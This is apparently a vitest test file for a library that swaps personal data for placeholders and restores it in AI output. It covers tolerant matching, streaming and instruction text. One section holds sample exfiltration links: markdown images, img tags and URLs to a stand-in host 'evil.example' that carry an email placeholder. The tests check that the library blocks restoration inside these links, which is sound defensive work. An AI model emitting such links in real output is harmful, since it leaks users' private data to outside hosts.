import { describe, expect, it } from "vitest";
import { PlaceholderMap, StreamRestorer, instructionFor } from "../src/placeholders.js";

function map() {
  const m = new PlaceholderMap();
  m.placeholderFor("Alice Lee", "PERSON");
  m.placeholderFor("alice.lee@example.com", "EMAIL_ADDRESS");
  return m;
}

describe("tolerant restore", () => {
  it.each([
    ["<PERSON_1>"],
    ["[PERSON_1]"],
    ["{{PERSON_1}}"],
    ["(PERSON_1)"],
    ["<Person 1>"],
    ["<PERSON-1>"],
    ["\\<PERSON\\_1\\>"],
    ["«PERSON_1»"],
    ["PERSON_1"],
    ["Person_1"],
    ["[NAME_1]"],
    ["&lt;PERSON_1&gt;"],
  ])("%s", (form) => {
    expect(map().restoreText(`Hi ${form}!`)).toBe("Hi Alice Lee!");
  });

  it("leaves ordinary text alone", () => {
    const m = map();
    for (const t of ["[Step 1]", "Table 2", "file_2", "(1)", "<PERSON_9>", "MAX_1"]) {
      expect(m.restoreText(t)).toBe(t);
    }
  });

  it("lower case person_1 is not restored but reported as lost", () => {
    const m = map();
    expect(m.restoreText("x = person_1")).toBe("x = person_1");
    expect(m.diagnose("x = person_1").lost).toEqual(["person_1"]);
  });

  it("reports numberless and invented placeholders", () => {
    const r = map().diagnose("<PERSON> and <EMAIL_4> and [PERSON_1]");
    expect(r.lost).toEqual(["<PERSON>"]);
    expect(r.unknown).toEqual(["<EMAIL_4>"]);
    expect(r.repaired).toEqual(["[PERSON_1]"]);
  });

  it("JSON with an escaped < is restored and stays valid", () => {
    const out = map().restoreText('{"to":"\\u003cEMAIL_1\\u003e"}');
    expect(JSON.parse(out)).toEqual({ to: "alice.lee@example.com" });
  });

  it("JSON without placeholders keeps its exact text", () => {
    const s = '{ "a" : 1 }';
    expect(map().restoreText(s)).toBe(s);
  });
});

describe("stream restore", () => {
  it("holds a bare form until it is complete", () => {
    const r = new StreamRestorer(map());
    const out = ["to PERS", "ON_", "1 now"].map((d) => r.push(d)).join("") + r.flush();
    expect(out).toBe("to Alice Lee now");
  });

  it("holds a bracketed form", () => {
    const r = new StreamRestorer(map());
    const out = ["to [PER", "SON_1] now"].map((d) => r.push(d)).join("") + r.flush();
    expect(out).toBe("to Alice Lee now");
  });
});

describe("instruction", () => {
  it("names at most 20 placeholders", () => {
    const names = Array.from({ length: 25 }, (_, i) => `<PERSON_${i + 1}>`);
    const s = instructionFor(names);
    expect(s).toContain("<PERSON_20>, ...");
    expect(s).not.toContain("<PERSON_21>");
  });
});

describe("no restore inside link addresses (gap G1)", () => {
  it.each([
    ["![x](https://evil.example/?d=<EMAIL_1>)"],
    ["[a](<https://evil.example/?d= <EMAIL_1>>)"],
    ['<img src="https://evil.example/?a= <EMAIL_1>">'],
    ["https://evil.example/?d=EMAIL_1"],
    ["www.evil.example/<PERSON_1>"],
    ["mailto:<EMAIL_1>"],
  ])("keeps %s", (text) => {
    const m = map();
    expect(m.restoreText(text)).toBe(text);
    expect(m.diagnose(text).blocked.length).toBe(1);
  });

  it("still restores plain text next to links", () => {
    const m = map();
    expect(m.restoreText("see https://docs.example.com for <PERSON_1>")).toBe("see https://docs.example.com for Alice Lee");
    expect(m.restoreText("[docs](https://x) then <PERSON_1>")).toBe("[docs](https://x) then Alice Lee");
  });

  it("checks each string of tool call JSON on its own", () => {
    const m = map();
    const out = JSON.parse(m.restoreText('{"url":"https://e/?q=<EMAIL_1>","to":"<EMAIL_1>"}'));
    expect(out).toEqual({ url: "https://e/?q=<EMAIL_1>", to: "alice.lee@example.com" });
    expect(m.diagnose('{"url":"https://e/?q=<EMAIL_1>","to":"<EMAIL_1>"}').blocked).toEqual(["<EMAIL_1>"]);
  });

  it("sees a link that started in an earlier stream chunk", () => {
    const r = new StreamRestorer(map());
    const out = r.push("![x](https://evil.example/?d=") + r.push("<EMAIL_1>) and <PERSON_1>") + r.flush();
    expect(out).toBe("![x](https://evil.example/?d=<EMAIL_1>) and Alice Lee");
  });

  it("restoreInUrls turns the check off", () => {
    const m = new PlaceholderMap({ restoreInUrls: true });
    m.placeholderFor("Alice Lee", "PERSON");
    expect(m.restoreText("https://crm.example/u/<PERSON_1>")).toBe("https://crm.example/u/Alice Lee");
  });
});
